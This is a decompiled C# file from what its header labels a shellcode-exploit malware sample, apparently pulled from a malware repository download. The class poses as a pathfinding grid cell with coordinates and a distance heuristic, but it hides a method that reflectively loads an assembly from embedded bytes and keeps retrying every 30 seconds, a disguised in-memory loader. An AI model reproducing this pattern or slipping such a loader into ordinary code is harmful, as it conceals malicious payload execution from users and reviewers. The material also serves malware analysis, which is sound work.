// Decompiled with JetBrains decompiler
// Type: PATH_F.Cell
// Assembly: PATH_F, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83C76E89-0EC0-4556-AC03-47BAF793022C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-3e61ff7da9c135135af8936d7fb362a285b02c6431c8614eda55d2cce3bf3ff7.exe

using System;
using System.Reflection;
using System.Threading;

namespace PATH_F
{
  public class Cell
  {
    public static Assembly UHWA98FYF()
    {
      while (true)
      {
        try
        {
          return Thread.GetDomain().Load(Dijkstra.kjhwaiuyfw());
        }
        catch
        {
          Thread.Sleep(30000);
        }
      }
    }

    public int index { get; set; }

    public int x { get; set; }

    public int y { get; set; }

    public bool start { get; set; }

    public bool end { get; set; }

    public bool przeszkoda { get; set; }

    public bool klikniety { get; set; }

    public bool walkable { get; set; }

    public bool main { get; set; }

    public int Koszt { get; set; }

    public double Dystans { get; set; }

    public double KosztDystansu { get; set; }

    public Cell Rodzic { get; set; }

    public int isStart { get; set; }

    public int isEnd { get; set; }

    public void SetDistance(int targetX, int targetY)
    {
      int val1 = Math.Abs(targetX - this.x);
      int val2 = Math.Abs(targetY - this.y);
      this.Dystans = (double) (10 * (val1 + val2) + -6 * Math.Min(val1, val2));
    }
  }
}
